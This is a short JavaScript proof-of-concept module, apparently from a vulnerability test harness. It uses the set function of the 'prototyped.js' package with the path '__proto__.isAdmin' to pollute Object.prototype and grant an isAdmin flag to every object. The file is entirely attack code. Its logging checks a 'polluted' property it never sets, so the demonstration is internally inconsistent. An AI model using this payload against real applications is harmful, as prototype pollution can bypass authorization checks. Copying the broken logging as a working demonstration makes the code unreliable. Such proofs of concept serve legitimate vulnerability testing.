function exploitFunction(payload) {
  const set = require("prototyped.js/dist/object/set").default;
  console.log("Prototype before set", {}.polluted);
  set({}, "__proto__.isAdmin", true);
  console.log("Prototype after set", {}.polluted);
}

module.exports = { exploitFunction };